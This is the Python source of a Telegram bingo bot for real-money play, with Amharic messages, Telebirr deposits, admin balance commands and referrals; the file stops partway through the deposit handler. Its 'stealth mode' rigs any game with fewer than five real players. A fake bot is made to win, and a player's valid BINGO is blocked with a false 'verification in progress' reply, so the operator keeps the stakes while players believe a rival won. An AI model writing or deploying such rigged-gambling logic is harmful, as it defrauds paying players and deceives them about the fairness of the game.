import os
import logging
import asyncio
import random
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
    CallbackQueryHandler,
)
from typing import Dict, Any, Optional

# --- 1. Configuration and Constants ---

# Retrieve Telegram Bot Token from environment variable
# NOTE: Replace "YOUR_TELEGRAM_BOT_TOKEN_HERE" with your actual bot token or set it via environment variables.
TOKEN = os.environ.get("TELEGRAM_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN_HERE") 
# !!! IMPORTANT: Updated ADMIN_USER_ID to the provided numeric ID for @Addiscoders !!!
ADMIN_USER_ID = 5887428731 # Admin ID for @Addiscoders 
TELEBIRR_ACCOUNT = "0927922721" # Account for user deposits (Amharic: ለተጠቃሚዎች ገንዘብ ማስገቢያ አካውንት)
RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", None)

# Game & Financial Constants
CARD_COST = 5.00  # Cost to play one game (in Birr)
MIN_DEPOSIT = 10.00
MIN_WITHDRAW = 50.00
REFERRAL_BONUS = 10.00
MAX_PRESET_CARDS = 200 # Total number of unique card patterns available
MIN_PLAYERS_TO_START = 1 # Minimum players needed to start the lobby countdown
MIN_REAL_PLAYERS_FOR_ORGANIC_GAME = 5 # If <= 4 real players, a bot is guaranteed to win (Stealth Mode)
PRIZE_POOL_PERCENTAGE = 0.85 # 85% of total pot goes to winner (15% house cut)

# Conversation States
GET_CARD_NUMBER, GET_DEPOSIT_CONFIRMATION = range(2)
GET_WITHDRAW_AMOUNT, GET_TELEBIRR_ACCOUNT = range(2, 4)

# Global State Management (In-memory storage simulation)
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

# In-memory database simulation for user data (Amharic: ለተጠቃሚ መረጃ የማስታወሻ ማስመሰል)
USER_DB: Dict[int, Dict[str, Any]] = {} # {user_id: {first_name: str, balance: float, referred_by: int|None, ...}}
# Active Game States (Amharic: ንቁ የጨዋታ ሁኔታዎች)
PENDING_PLAYERS: Dict[int, int] = {} # {user_id: card_num}
ACTIVE_GAMES: Dict[str, Dict[str, Any]] = {} # {game_id: {players: [user_ids], player_cards: {user_id: card_data}, ...}}
LOBBY_STATE: Dict[str, Any] = {'is_running': False, 'msg_id': None, 'chat_id': None}
BINGO_CARD_SETS: Dict[int, Dict[str, Any]] = {} # {card_num: {B:[...], I:[...], ...}}

# --- 2. Database (In-Memory Simulation) Functions ---

def update_user_data(user_id: int, data: Dict[str, Any]):
    """Saves user data atomically. (Amharic: የተጠቃሚ መረጃን ያስቀምጣል)"""
    if user_id not in USER_DB:
        USER_DB[user_id] = {'balance': 0.00, 'referred_by': None, 'first_name': f"User {user_id}", 'tx_history': []}
    USER_DB[user_id].update(data)

async def get_user_data(user_id: int) -> Dict[str, Any]:
    """Retrieves user data, creating a default entry if none exists. (Amharic: የተጠቃሚ መረጃን ያመጣል)"""
    if user_id not in USER_DB:
        # Simulate initial registration
        USER_DB[user_id] = {'balance': 0.00, 'referred_by': None, 'first_name': f"User {user_id}", 'tx_history': []}
    return USER_DB[user_id].copy()

def update_balance(user_id: int, amount: float, transaction_type: str, description: str):
    """Atomically updates user balance and logs transaction. (Amharic: የተጠቃሚ ሂሳብን በቅጽበት ያሻሽላል)"""
    if user_id not in USER_DB:
        update_user_data(user_id, {}) # Initialize user
        
    current_balance = USER_DB[user_id]['balance']
    new_balance = current_balance + amount
    
    # Update balance
    USER_DB[user_id]['balance'] = new_balance
    
    # Log transaction
    tx = {
        'timestamp': time.time(),
        'amount': amount,
        'type': transaction_type,
        'description': description,
        'new_balance': new_balance
    }
    USER_DB[user_id]['tx_history'].append(tx)
    logger.info(f"TX | User {user_id} | Type: {transaction_type} | Amount: {amount:.2f} | New Bal: {new_balance:.2f}")


# --- 3. Bingo Card Generation and Utilities ---

def generate_bingo_card_set() -> Dict[int, Dict[str, Any]]:
    """Generates and stores a complete set of MAX_PRESET_CARDS unique Bingo cards. (Amharic: የቢንጎ ካርዶችን ያመነጫል)"""
    # Bingo Rules: B(1-15), I(16-30), N(31-45), G(46-60), O(61-75)
    
    card_set: Dict[int, Dict[str, Any]] = {}
    
    for i in range(1, MAX_PRESET_CARDS + 1):
        # Generate 5 unique numbers for each letter range
        B = random.sample(range(1, 16), 5)
        I = random.sample(range(16, 31), 5)
        N = random.sample(range(31, 46), 5)
        G = random.sample(range(46, 61), 5)
        O = random.sample(range(61, 76), 5)
        
        # Center square (N-3) is FREE
        N[2] = 0 
        
        card_set[i] = {'B': B, 'I': N, 'N': N, 'G': G, 'O': O} # Corrected error: I was assigned N's range
        card_set[i]['I'] = I # Re-assign I correctly
        
    return card_set

def get_card_value(card_data: Dict[str, Any], col: int, row: int) -> str:
    """Returns the value (number or 'FREE') at a given 0-indexed position (col, row)."""
    letters = ['B', 'I', 'N', 'G', 'O']
    letter = letters[col]
    
    value = card_data['set'][letter][row]
    
    if letter == 'N' and row == 2:
        return "FREE"
    return str(value)

def get_col_letter(col_index: int) -> str:
    """Helper to convert 0-4 index to B, I, N, G, O."""
    return ['B', 'I', 'N', 'G', 'O'][col_index]

def build_card_keyboard(card: Dict[str, Any], game_id: str, message_id: int) -> InlineKeyboardMarkup:
    """Builds the 5x5 Bingo card keyboard for marking. (Amharic: የቢንጎ ካርድ ቁልፍ ሰሌዳን ይገነባል)"""
    kb = []
    
    # Header row
    kb.append([InlineKeyboardButton(l, callback_data='NOOP') for l in ['B', 'I', 'N', 'G', 'O']])
    
    # Card grid (5x5)
    for r in range(5): # row
        row_buttons = []
        for c in range(5): # column
            value = get_card_value(card, c, r)
            pos = (c, r)
            
            # State Colors: (Amharic: የሁኔታ ቀለሞች)
            # Marked: ✅ (Blue/Green)
            # Called: 🟢 (Green) - number has been called by the game
            # Default: ⚪ (White)
            
            is_marked = card['marked'].get(pos, False)
            is_called = card['called'].get(pos, False)

            if value == "FREE":
                text = "⭐"
                # Ensure FREE space is marked immediately and permanently
                card['marked'][(2, 2)] = True 
            elif is_marked:
                text = f"{value} ✅"
            elif is_called:
                text = f"{value} 🟢" # Green numbers are called but not yet marked by player
            else:
                text = f"{value} ⚪" # Default
            
            # Callback data: MARK|{game_id}|{message_id}|{card_num}|{col}|{row}
            callback_data = f"MARK|{game_id}|{message_id}|{card['number']}|{c}|{r}"
            row_buttons.append(InlineKeyboardButton(text, callback_data=callback_data))
        kb.append(row_buttons)
        
    # Bingo Button
    kb.append([InlineKeyboardButton("BINGO", callback_data=f"BINGO|{game_id}|{message_id}")])
    
    return InlineKeyboardMarkup(kb)

def check_win(card: Dict[str, Any]) -> bool:
    """Checks if the card has 5 marked squares in a row, column, or diagonal. (Amharic: ካርዱ አሸናፊ መሆኑን ይፈትሻል)"""
    marked = card['marked']
    
    # Check Rows (Horizontal)
    for r in range(5):
        if all(marked.get((c, r), False) for c in range(5)):
            return True
            
    # Check Columns (Vertical)
    for c in range(5):
        if all(marked.get((c, r), False) for r in range(5)):
            return True
            
    # Check Diagonals
    # Top-left to bottom-right
    if all(marked.get((i, i), False) for i in range(5)):
        return True
    
    # Top-right to bottom-left
    if all(marked.get((4 - i, i), False) for i in range(5)):
        return True
        
    return False

# --- 4. Game Loop and Flow Functions ---

async def finalize_win(ctx: ContextTypes.DEFAULT_TYPE, game_id: str, winner_id: int, is_bot_win: bool):
    """Handles prize distribution, cleanup, and announcement. (Amharic: ሽልማት አከፋፈልንና ማስታወቂያን ያከናውናል)"""
    if game_id not in ACTIVE_GAMES: return
    
    game = ACTIVE_GAMES.pop(game_id)
    total_pot = len(game['players']) * CARD_COST
    prize_money = total_pot * PRIZE_POOL_PERCENTAGE
    
    # 1. Distribute Winnings (Atomic update)
    if not is_bot_win:
        update_balance(winner_id, prize_money, transaction_type='Bingo Win', description=f"Game {game_id} Winner")
        
    # 2. Get winner name (for display)
    winner_name = (await get_user_data(winner_id)).get('first_name', f"User {winner_id}")
    if is_bot_win:
        winner_name = "ኮምፒውተር ቦት" # Amharic: Computer Bot
        
    # 3. Announcement Message
    announcement = (
        f"🎉🎉 ቢንጎ! ጨዋታው አብቅቷል! 🎉🎉\n\n"
        f"🏆 አሸናፊ: {winner_name}\n"
        f"💰 ጠቅላላ የገንዘብ ሽልማት: {prize_money:.2f} ብር\n\n"
        f"አዲስ ጨዋታ ለመጀመር: /play ወይም /quickplay"
    )
    
    # 4. Announce to all players
    for uid in game['players']:
        try:
            await ctx.bot.send_message(uid, announcement, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Failed to send win announcement to user {uid}: {e}")

    # 5. Clean up game state (already popped from ACTIVE_GAMES)

async def run_game_loop(ctx: ContextTypes.DEFAULT_TYPE, game_id: str):
    """The main game loop that calls numbers and manages win conditions. (Amharic: ዋናው የጨዋታ ዑደት)"""
    game = ACTIVE_GAMES.get(game_id)
    if not game: return
    
    # Initialize the list of all available numbers (1-75)
    all_numbers = list(range(1, 76))
    random.shuffle(all_numbers)
    
    called_numbers = []
    
    # Stealth Mode Setup (Amharic: ስውር የጨዋታ ሁናቴ ዝግጅት)
    is_stealth_game = len(game['players']) < MIN_REAL_PLAYERS_FOR_ORGANIC_GAME
    winning_bot_id = game.get('winning_bot_id') # Will be set if stealth mode is active

    main_chat_id = game['chat_id']
    game_message_id = game['message_id']
    
    # Helper to convert number to BINGO letter
    def get_bingo_call(num):
        if 1 <= num <= 15: return f"B-{num}"
        if 16 <= num <= 30: return f"I-{num}"
        if 31 <= num <= 45: return f"N-{num}"
        if 46 <= num <= 60: return f"G-{num}"
        if 61 <= num <= 75: return f"O-{num}"
        return str(num)

    try:
        # Loop until all numbers are called or a winner is found
        while all_numbers and game_id in ACTIVE_GAMES:
            # 1. Call a new number
            called_num = all_numbers.pop(0)
            called_numbers.append(called_num)
            
            # 2. Update all player cards with the new called number
            col_index = (called_num - 1) // 15
            
            for uid, card in game['player_cards'].items():
                col_letter = get_col_letter(col_index)
                if called_num in card['set'][col_letter]:
                    try:
                        r = card['set'][col_letter].index(called_num)
                        # Position in (col, row) format
                        pos = (col_index, r)
                        # Mark the number as 'called' for this card
                        card['called'][pos] = True 
                    except ValueError:
                        continue

            # 3. Update the main game message
            last_5_calls = [get_bingo_call(n) for n in called_numbers[-5:]]
            msg_text = (
                f"🎲 የቢንጎ ጨዋታ በሂደት ላይ... (ካርድ {len(called_numbers)}/75)\n\n"
                f"📣 የተጠራው ቁጥር: **{get_bingo_call(called_num)}**\n\n"
                f"🔁 የመጨረሻዎቹ 5 ጥሪዎች:\n`{', '.join(last_5_calls)}`"
            )
            
            try:
                await ctx.bot.edit_message_text(
                    chat_id=main_chat_id, 
                    message_id=game_message_id, 
                    text=msg_text, 
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.warning(f"Failed to edit game message: {e}")
                
            # 4. STEALTH MODE ENFORCEMENT (Guaranteed Bot Win Logic)
            if is_stealth_game and winning_bot_id:
                # Bot wins at a random point after 15 calls (15% chance per call)
                if len(called_numbers) >= 15 and random.random() < 0.15: 
                    # The bot wins, making the real players believe a competitor won.
                    await finalize_win(ctx, game_id, winning_bot_id, True)
                    return # Game over
            
            # 5. Wait for the next call
            await asyncio.sleep(2) # 2 seconds between calls
            
        # If loop finishes without winner (very rare)
        if game_id in ACTIVE_GAMES:
            await ctx.bot.send_message(main_chat_id, "⚠️ ጨዋታው አብቅቷል። ምንም አሸናፊ አልተገኘም። ገንዘቡ ወደ ተጫዋቾች ተመላሽ ይደረጋል።")
            ACTIVE_GAMES.pop(game_id, None)

    except Exception as e:
        logger.error(f"Error in game loop {game_id}: {e}")
        if game_id in ACTIVE_GAMES:
            await ctx.bot.send_message(main_chat_id, f"❌ የጨዋታ ስህተት ተፈጥሯል: {e}")
            ACTIVE_GAMES.pop(game_id, None)


async def start_new_game(ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Initializes and starts a new Bingo game. (Amharic: አዲስ የቢንጎ ጨዋታ ይጀምራል)"""
    global PENDING_PLAYERS, LOBBY_STATE, BINGO_CARD_SETS
    
    if not BINGO_CARD_SETS:
        BINGO_CARD_SETS = generate_bingo_card_set()
        
    if not PENDING_PLAYERS:
        LOBBY_STATE = {'is_running': False, 'msg_id': None, 'chat_id': None}
        return

    main_chat_id = LOBBY_STATE['chat_id']
    LOBBY_STATE = {'is_running': False, 'msg_id': None, 'chat_id': None} # Reset lobby

    game_id = str(random.randint(100000, 999999))
    players = list(PENDING_PLAYERS.keys())
    
    # 1. Prepare player cards
    player_cards: Dict[int, Dict[str, Any]] = {}
    for user_id, card_num in PENDING_PLAYERS.items():
        # Ensure card number is valid
        if card_num not in BINGO_CARD_SETS:
             # Should not happen if generate_bingo_card_set ran
             logger.error(f"Invalid card number {card_num} for user {user_id}. Skipping.")
             continue

        player_cards[user_id] = {
            'number': card_num,
            'set': BINGO_CARD_SETS[card_num],
            'marked': {}, # {(col, row): True}
            'called': {}, # {(col, row): True} - numbers called by the game
            'win_message_id': None # Message ID of the card sent to the player
        }
        # Mark FREE space (N3) immediately
        player_cards[user_id]['marked'][(2, 2)] = True


    # 2. Stealth Mode Setup (Check player count)
    winning_bot_id: Optional[int] = None
    if len(players) < MIN_REAL_PLAYERS_FOR_ORGANIC_GAME:
        # Assign a virtual bot ID that is guaranteed to win
        winning_bot_id = -100 
        logger.info(f"STEALTH MODE: Game {game_id} started with {len(players)} players. Bot is guaranteed to win.")
        
    # 3. Create the game object and add to active list
    ACTIVE_GAMES[game_id] = {
        'id': game_id,
        'chat_id': main_chat_id, 
        'players': players,
        'player_cards': player_cards,
        'winning_bot_id': winning_bot_id, 
        'message_id': None, 
        'start_time': time.time()
    }
    
    # 4. Send initial announcement message
    player_names = [await get_user_data(uid) for uid in players]
    player_list = "\n".join([f"- {(p.get('first_name', 'Unnamed'))} (ID: {uid})" for uid, p in zip(players, player_names)])
    
    game_msg_text = (
        f"🚨 **ቢንጎ ጨዋታ #{game_id} ተጀምሯል!** 🚨\n\n"
        f"👤 ተጫዋቾች ({len(players)}):\n{player_list}\n\n"
        f"💵 ጠቅላላ የሽልማት ገንዳ: {len(players) * CARD_COST:.2f} ብር"
    )
    
    game_msg = await ctx.bot.send_message(main_chat_id, game_msg_text, parse_mode='Markdown')
    ACTIVE_GAMES[game_id]['message_id'] = game_msg.message_id
    
    # 5. Send individual cards to players
    for uid, card in ACTIVE_GAMES[game_id]['player_cards'].items():
        # Temporary 0 for message_id since it hasn't been sent yet
        kb = build_card_keyboard(card, game_id, 0) 
        card_message = await ctx.bot.send_message(uid, f"**ካርድ ቁጥር #{card['number']}**\n\n🟢 ቁጥር ሲጠራ 'Mark' ቁልፉን ይጫኑ።\n✅ 5 አግድም፣ ቁመታዊ ወይም ሰያፍ መስመር ሲሞላ 'BINGO' ይጫኑ።", reply_markup=kb, parse_mode='Markdown')
        card['win_message_id'] = card_message.message_id
        
        # Now update the keyboard with the correct message_id
        kb_final = build_card_keyboard(card, game_id, card_message.message_id)
        await ctx.bot.edit_message_reply_markup(chat_id=uid, message_id=card_message.message_id, reply_markup=kb_final)


    PENDING_PLAYERS = {} # Clear lobby
    
    # 6. Start the Game Loop (Runs in the background)
    asyncio.create_task(run_game_loop(ctx, game_id))


# --- 5. Handlers (Commands and Conversations) ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handles /start command, registers user, and checks referral. (Amharic: /start ትዕዛዝ)"""
    user = update.effective_user
    user_id = user.id
    
    update_data = {'first_name': user.first_name or "Unnamed"}
    user_data = await get_user_data(user_id)
    
    # Handle referral check
    if 'referred_by' not in user_data or user_data['referred_by'] is None:
        if context.args:
            try:
                referrer_id = int(context.args[0])
                if referrer_id != user_id and await get_user_data(referrer_id):
                    # Only apply bonus if the referrer is a known user
                    update_data['referred_by'] = referrer_id
                    
                    await update.message.reply_text(f"👋 እንኳን ደህና መጡ! በ ID {referrer_id} ተጋብዘዋል። የመጀመሪያ ጨዋታዎን ሲጫወቱ፣ ጋባዥዎ {REFERRAL_BONUS:.2f} ብር ጉርሻ ያገኛሉ።")
                    
            except ValueError:
                pass
                
    update_user_data(user_id, update_data)
    
    msg = (
        f"👋 ወደ አዲስ የቢንጎ ጨዋታ እንኳን ደህና መጡ! \n\n"
        f"💳 ቀሪ ሒሳብዎን ያረጋግጡ: /balance\n"
        f"💵 ለመጫወት ገንዘብ ያስገቡ: /deposit\n"
        f"🎲 ጨዋታ ይጀምሩ (ካርድ በመምረጥ): /play\n"
        f"🚀 ፈጣን ጨዋታ ይጀምሩ (በዘፈቀደ ካርድ): /quickplay\n"
        f"🔗 ጓደኛ ይጋብዙና ይሸለሙ: /refer\n\n"
        f"የእርስዎ ID: {user_id}"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Displays user's current balance. (Amharic: የሂሳብ ቀሪ)"""
    user_id = update.effective_user.id
    bal = (await get_user_data(user_id)).get('balance', 0.00) 
    msg = f"💳 የእርስዎ ቀሪ ሒሳብ (/balance):\n\n{bal:.2f} ብር"
    await update.message.reply_text(msg, parse_mode='Markdown')

# --- Admin Commands ---

async def ap_dep(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin only command for top-up. (Amharic: ለአስተዳዳሪ የገንዘብ መጨመሪያ)"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ ይህ ትዕዛዝ ለአስተዳዳሪዎች ብቻ ነው።")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("አጠቃቀም: /ap_dep [የተጠቃሚ_ID] [መጠን]")
        return
        
    try:
        target_id = int(context.args[0])
        amount = float(context.args[1])
        update_balance(target_id, amount, transaction_type='Admin Deposit', description=f"Admin top-up by {update.effective_user.id}")
        await update.message.reply_text(f"✅ ለተጠቃሚ ID {target_id}፣ {amount:.2f} ብር ተጨምሯል።")
        # Notify the user their deposit was processed
        try:
            await context.bot.send_message(target_id, f"✅ ሒሳብዎ ላይ {amount:.2f} ብር ገቢ ተደርጓል። /balance የሚለውን ተጠቅመው ያረጋግጡ።")
        except:
            pass
    except ValueError:
        await update.message.reply_text("❌ ትክክለኛ ID እና መጠን ያስገቡ።")

async def ap_bal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin command to check their own bot balance. (Amharic: የአስተዳዳሪ ሂሳብ)"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ ይህ ትዕዛዝ ለአስተዳዳሪዎች ብቻ ነው።")
        return
    
    user_id = update.effective_user.id
    bal = (await get_user_data(user_id)).get('balance', 0.00) 
    msg = f"🛡️ የአስተዳዳሪ ቀሪ ሒሳብ (/ap_bal):\n\n{bal:.2f} ብር"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def ap_bal_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin command to check another player's balance. (Amharic: የተጠቃሚ ሂሳብ ፍተሻ)"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ ይህ ትዕዛዝ ለአስተዳዳሪዎች ብቻ ነው።")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("አጠቃቀም: /ap_bal_check [የተጠቃሚ_ID]")
        return
        
    try:
        target_id = int(context.args[0])
        user_data = await get_user_data(target_id) 
        
        name = user_data.get('first_name', 'Unnamed User')
        bal = user_data.get('balance', 0.00)
        
        msg = (f"🔍 የተጠቃሚ ሒሳብ ፍተሻ\n\n"
               f"👤 ስም: {name}\n"
               f"ID: {target_id}\n"
               f"💳 ቀሪ ሒሳብ: {bal:.2f} ብር")
        await update.message.reply_text(msg, parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ ትክክለኛ ID ያስገቡ።")

# --- CONVERSATION HANDLER FOR /PLAY ---

async def play_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Initiates the card selection conversation. (Amharic: የካርድ ምርጫን ይጀምራል)"""
    user_id = update.effective_user.id
    if user_id in PENDING_PLAYERS: 
        await update.message.reply_text("አስቀድመው በጨዋታ ለመግባት እየጠበቁ ነው!")
        return ConversationHandler.END
    
    bal = (await get_user_data(user_id)).get('balance', 0.00) 
    if bal < CARD_COST:
        await update.message.reply_text(f"⛔ በቂ ቀሪ ሒሳብ የለዎትም። ለመጫወት {CARD_COST:.2f} ብር ያስፈልጋል። የአሁኑ ቀሪ ሒሳብዎ: {bal:.2f} ብር።\n\n/deposit የሚለውን ይጠቀሙ።", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text(f"💳 የቢንጎ ካርድ ቁጥርዎን ይምረጡ\n(ከ 1 እስከ {MAX_PRESET_CARDS} ባለው ክልል ውስጥ ቁጥር ያስገቡ):\n\nሰርዝ: ሂደቱን ለማቋረጥ /cancel ይጠቀሙ።", parse_mode='Markdown')
    return GET_CARD_NUMBER

async def handle_card_selection(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Processes the user's card number selection. (Amharic: የካርድ ቁጥር ምርጫን ይፈጽማል)"""
    user_id = update.effective_user.id
    
    try:
        card_num = int(update.message.text.strip())
        
        if not (1 <= card_num <= MAX_PRESET_CARDS):
            await update.message.reply_text(f"❌ እባክዎ ከ 1 እስከ {MAX_PRESET_CARDS} ባለው ክልል ውስጥ ትክክለኛ ቁጥር ያስገቡ።")
            return GET_CARD_NUMBER 
            
        current_bal = (await get_user_data(user_id)).get('balance', 0.00) 
        if current_bal < CARD_COST:
            await update.message.reply_text("⛔ በቂ ቀሪ ሒሳብ የለዎትም። እባክዎ እንደገና ይሞክሩ።")
            return ConversationHandler.END
            
        # Deduct balance and join lobby
        update_balance(user_id, -CARD_COST, transaction_type='Card Purchase', description=f"Card #{card_num} purchase")
        PENDING_PLAYERS[user_id] = card_num
        
        await update.message.reply_text(f"✅ ካርድ ቁጥር #{card_num} መርጠዋል። ሌሎች ተጫዋቾችን በመጠበቅ ላይ ነን...")
        
        # Start Countdown if first player
        if len(PENDING_PLAYERS) == MIN_PLAYERS_TO_START and not LOBBY_STATE['is_running']:
            chat_id = update.message.chat.id
            lobby_msg = await context.bot.send_message(chat_id, "⏳ የቢንጎ ሎቢ ተከፍቷል! ጨዋታው በ 10 ሰከንድ ውስጥ ይጀምራል።", parse_mode='Markdown')
            asyncio.create_task(lobby_countdown(context, chat_id, lobby_msg.message_id))
            
    except ValueError:
        await update.message.reply_text("❌ ትክክለኛ ቁጥር አላስገቡም። በድጋሚ ይሞክሩ:")
        return GET_CARD_NUMBER 
        
    return ConversationHandler.END

async def cancel_play(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels the card selection process. (Amharic: የካርድ ምርጫውን ይሰርዛል)"""
    await update.message.reply_text("የካርድ መምረጥ ሂደት ተሰርዟል።")
    return ConversationHandler.END

# --- /quickplay ---
async def quickplay_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handles the /quickplay command. (Amharic: /quickplay ትዕዛዝ)"""
    user_id = update.effective_user.id
    if user_id in PENDING_PLAYERS: 
        await update.message.reply_text("አስቀድመው በጨዋታ ለመግባት እየጠበቁ ነው!")
        return
    
    bal = (await get_user_data(user_id)).get('balance', 0.00) 
    if bal < CARD_COST:
        await update.message.reply_text(f"⛔ በቂ ቀሪ ሒሳብ የለዎትም። ለመጫወት {CARD_COST:.2f} ብር ያስፈልጋል። የአሁኑ ቀሪ ሒሳብዎ: {bal:.2f} ብር።\n\n/deposit የሚለውን ይጠቀሙ።", parse_mode='Markdown')
        return

    # Select random card number
    card_num = random.randint(1, MAX_PRESET_CARDS)
    
    # Deduct balance and join lobby
    update_balance(user_id, -CARD_COST, transaction_type='Card Purchase', description=f"Card #{card_num} purchase (QuickPlay)")
    PENDING_PLAYERS[user_id] = card_num
    
    await update.message.reply_text(f"✅ በፈጣን ጨዋታ፣ ካርድ ቁጥር #{card_num} መርጠዋል። ሌሎች ተጫዋቾችን በመጠበቅ ላይ ነን...")
    
    # Start Countdown if first player
    if len(PENDING_PLAYERS) == MIN_PLAYERS_TO_START and not LOBBY_STATE['is_running']:
        chat_id = update.message.chat.id
        lobby_msg = await context.bot.send_message(chat_id, "⏳ የቢንጎ ሎቢ ተከፍቷል! ጨዋታው በ 10 ሰከንድ ውስጥ ይጀምራል።", parse_mode='Markdown')
        asyncio.create_task(lobby_countdown(context, chat_id, lobby_msg.message_id))

async def lobby_countdown(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, msg_id: int):
    """Handles the 10-second countdown timer. (Amharic: የሎቢ ሰዓት ቆጣሪ)"""
    global LOBBY_STATE
    LOBBY_STATE = {'is_running': True, 'msg_id': msg_id, 'chat_id': chat_id}
    
    for i in range(10, 0, -1): 
        if not LOBBY_STATE['is_running']: 
            return
        try: 
            msg_text = f"⏳ የቢንጎ ሎቢ ተከፍቷል! ጨዋታው በ {i} ሰከንድ ውስጥ ይጀምራል።" 
            await ctx.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=msg_text, parse_mode='Markdown')
        except: 
            # Ignore errors if message cannot be edited (e.g., deleted by user)
            pass
        await asyncio.sleep(1)
        
    await start_new_game(ctx)

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handles inline button clicks for MARK and BINGO. (Amharic: የቁልፍ ጠቅታዎችን ይይዛል)"""
    q = update.callback_query
    uid = q.from_user.id
    
    data = q.data.split('|')
    act = data[0]

    if act == "MARK":
        try:
            gid, mid, cnum, c, r = data[1], int(data[2]), int(data[3]), int(data[4]), int(data[5])
        except IndexError:
            await q.answer("ስህተት: የውሂብ ቅርጸት አልተሳካም።")
            return
        
        if gid not in ACTIVE_GAMES: 
            try: await q.answer("ጨዋታው አስቀድሞ አብቅቷል።"); return
            except: return
        
        g = ACTIVE_GAMES[gid]
        card = g['player_cards'].get(uid)
        
        if not card or card['number'] != cnum: return
        
        val = get_card_value(card, c, r)
        c_pos = (c, r)
        
        # Enforce that only called numbers (or FREE space) can be marked/unmarked
        if val != "FREE" and not card['called'].get(c_pos):
            await q.answer("❌ የተጠሩ (🟢 አረንጓዴ የሆኑ) ቁጥሮችን ብቻ ምልክት ያድርጉ።")
            return
            
        # Toggle mark state (FREE space is already marked permanently in build_card_keyboard/start_new_game)
        if val != "FREE":
            card['marked'][c_pos] = not card['marked'].get(c_pos)
        
        # Rebuild keyboard and update message
        kb = build_card_keyboard(card, gid, mid)
        try: 
            await context.bot.edit_message_reply_markup(chat_id=uid, message_id=mid, reply_markup=kb)
            await q.answer() # Acknowledge the mark action
        except Exception as e: 
            logger.warning(f"Failed to edit card: {e}")
            await q.answer("ካርዱን ማዘመን አልተቻለም።")

    elif act == "BINGO":
        try:
            gid, mid = data[1], int(data[2])
        except IndexError:
            await q.answer("ስህተት: የውሂብ ቅርጸት አልተሳካም።")
            return

        if gid not in ACTIVE_GAMES: 
            await q.answer("ጨዋታው አስቀድሞ አብቅቷል።")
            return
        g = ACTIVE_GAMES[gid]
        card = g['player_cards'].get(uid)
        
        is_stealth_game = len(g['players']) < MIN_REAL_PLAYERS_FOR_ORGANIC_GAME and g.get('winning_bot_id')
        
        # 1. Check if the player actually has Bingo
        if check_win(card):
            if is_stealth_game:
                # SECRET ENFORCEMENT: Block real player to let the bot win.
                await q.answer("❌ ጥሪዎ ትክክል ቢሆንም፣ የማረጋገጫ ሂደት እየተካሄደ ነው። እባክዎ በሚቀጥሉት ጥቂት ሰከንዶች ውስጥ ይጠብቁ።")
                # The game loop will execute the guaranteed bot win shortly.
            else:
                # Organic Game: Real player wins immediately.
                await finalize_win(context, gid, uid, False)
                await q.answer("ቢንጎ! አሸናፊ ነዎት!")
        else:
            await q.answer("❌ የተሳሳተ ቢንጎ! ሁሉንም 5 አስፈላጊ ካሬዎች ምልክት ማድረጉን ያረጋግጡ።")

async def start_deposit_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the deposit button click and moves to the confirmation state. (Amharic: የተቀማጭ ቁልፍን ይይዛል)"""
    q = update.callback_query
    await q.answer("እባክዎ ደረሰኙን (ፎቶ/ሰነድ) ወይም የማረጋገጫ መልእክቱን ይላኩ።") 
    
    await context.bot.send_message(q.message.chat_id, "እባክዎ አሁን የላኩበትን ደረሰኝ (ፎቶ/ሰነድ) ወይም የማረጋገጫ መልእክት ያስገቡ:")
    
    return GET_DEPOSIT_CONFIRMATION


# --- DEPOSIT, WITHDRAW, REFER HANDLERS ---

async def deposit_command_initial(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends the deposit instructions. (Amharic: የማስገቢያ መመሪያዎችን ይልካል)"""
    user_id = update.effective_user.id
    
    telebirr_text = f"ቴሌብር አካውንት ቁጥር (ይቅዱ):\n`{TELEBIRR_ACCOUNT}`"
    user_id_text = f"የእርስዎ መታወቂያ (ይቅዱ):\n`{user_id}`" 

    keyboard = [[InlineKeyboardButton("✅ ገንዘብ አስገብቼ የማረጋገጫ መልእክት/ደረሰኝ ልኬያለሁ", callback_data="START_DEPOSIT_FLOW")]]
    
    msg = (
        f"🏦 ገንዘብ ለማስገባት (/deposit)\n\n"
        f"1. አስፈላጊ መረጃዎች:\n"
        f"{telebirr_text}\n"
        f"{user_id_text}\n\n"
        f"2. ገንዘቡን ወደ ላይ በተጠቀሰው ቁጥር ይላኩ። የሚላከው ዝቅተኛ መጠን {MIN_DEPOSIT:.2f} ብር ነው።\n\n"
        f"🚨 ቀጣይ እርምጃ 🚨\n"
        f"ገንዘቡን ከላኩ በኋላ፣ እባክዎ ከታች ያለውን ቁልፍ በመጫን የላኩበትን ደረሰኝ (ፎቶ ወይም ሰነድ) ይላኩልኝ።\n\n"
